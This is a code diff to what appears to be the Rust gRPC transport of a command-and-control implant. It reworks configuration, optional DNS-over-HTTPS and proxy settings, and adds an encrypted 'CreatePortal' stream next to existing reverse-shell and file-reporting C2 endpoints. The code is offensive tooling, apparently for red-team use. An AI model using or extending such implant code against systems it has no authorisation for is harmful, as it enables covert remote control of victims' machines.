@@ -1,6 +1,7 @@
 use anyhow::Result;
 use hyper::Uri;
 use pb::c2::*;
+use pb::config::Config;
 use std::str::FromStr;
 use std::sync::mpsc::{Receiver, Sender};
 use tonic::GrpcMethod;
@@ -23,6 +24,7 @@ static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
 static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
+static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 #[allow(clippy::upper_case_acronyms)]
 #[derive(Debug, Clone)]
@@ -35,16 +37,29 @@ impl Transport for GRPC {
         GRPC { grpc: None }
     }
 
-    fn new(callback: String, proxy_uri: Option<String>) -> Result<Self> {
+    fn new(config: Config) -> Result<Self> {
+        // Extract URI and EXTRA from config using helper functions
+        let callback = crate::transport::extract_uri_from_config(&config)?;
+        let extra_map = crate::transport::extract_extra_from_config(&config);
+
         let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
 
-        // Create HTTP connector with DNS-over-HTTPS support if enabled
         #[cfg(feature = "grpc-doh")]
-        let mut http: HttpConnector<HickoryResolverService> =
-            crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?;
+        let doh: Option<&String> = extra_map.get("DOH");
+
+        #[cfg(feature = "grpc-doh")]
+        let mut http = match doh {
+            // TODO: Add provider selection
+            Some(_provider) => {
+                crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?
+            }
+            None => hyper::client::HttpConnector::new(),
+        };
 
         #[cfg(not(feature = "grpc-doh"))]
         let mut http = hyper::client::HttpConnector::new();
+
+        let proxy_uri = extra_map.get("http_proxy");
 
         http.enforce_http(false);
         http.set_nodelay(true);
@@ -194,9 +209,48 @@ impl Transport for GRPC {
         Ok(())
     }
 
-    fn get_type(&mut self) -> pb::c2::beacon::Transport {
-        return pb::c2::beacon::Transport::Grpc;
+    async fn create_portal(
+        &mut self,
+        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
+        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
+    ) -> Result<()> {
+        // Wrap output receiver in stream
+        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
+
+        // Open gRPC Bi-Directional Stream
+        let resp = self.create_portal_impl(req_stream).await?;
+        let mut resp_stream = resp.into_inner();
+
+        // Spawn task to deliver portal input
+        tokio::spawn(async move {
+            while let Some(msg) = match resp_stream.message().await {
+                Ok(m) => m,
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("failed to receive gRPC stream response: {}", _err);
+
+                    None
+                }
+            } {
+                match tx.send(msg).await {
+                    Ok(_) => {}
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("failed to queue portal input: {}", _err);
+
+                        return;
+                    }
+                }
+            }
+        });
+
+        Ok(())
     }
+
+    fn get_type(&mut self) -> pb::c2::transport::Type {
+        pb::c2::transport::Type::TransportGrpc
+    }
+
     fn is_active(&self) -> bool {
         self.grpc.is_some()
     }
@@ -415,6 +469,37 @@ impl GRPC {
         let mut req = request.into_streaming_request();
         req.extensions_mut()
             .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
+        self.grpc
+            .as_mut()
+            .unwrap()
+            .streaming(req, path, codec)
+            .await
+    }
+
+    async fn create_portal_impl(
+        &mut self,
+        request: impl tonic::IntoStreamingRequest<Message = CreatePortalRequest>,
+    ) -> std::result::Result<
+        tonic::Response<tonic::codec::Streaming<CreatePortalResponse>>,
+        tonic::Status,
+    > {
+        if self.grpc.is_none() {
+            return Err(tonic::Status::new(
+                tonic::Code::FailedPrecondition,
+                "grpc client not created".to_string(),
+            ));
+        }
+        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
+            tonic::Status::new(
+                tonic::Code::Unknown,
+                format!("Service was not ready: {}", e),
+            )
+        })?;
+        let codec = pb::xchacha::ChachaCodec::default();
+        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CREATE_PORTAL_PATH);
+        let mut req = request.into_streaming_request();
+        req.extensions_mut()
+            .insert(GrpcMethod::new("c2.C2", "CreatePortal"));
         self.grpc
             .as_mut()
             .unwrap()
